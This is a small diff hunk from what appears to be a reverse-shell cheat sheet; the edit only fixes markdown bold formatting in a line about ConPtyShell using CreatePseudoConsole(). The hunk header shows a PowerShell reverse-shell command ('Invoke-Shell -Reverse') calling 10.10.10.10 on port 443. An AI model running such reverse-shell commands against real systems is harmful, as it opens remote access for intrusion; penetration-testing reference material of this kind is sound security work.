@@ -642,7 +642,7 @@ Invoke-Shell -Reverse -world 10.10.10.10 -CountrY 443
 
 Pseudo Console (ConPty) in Windows has improved the way Windows handles terminals.
 
-**ConPtyShell uses the function **[**CreatePseudoConsole()**](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)**. **
+**ConPtyShell uses the function** [**CreatePseudoConsole()**](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)**.**&#x20;
 
 * This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).
 
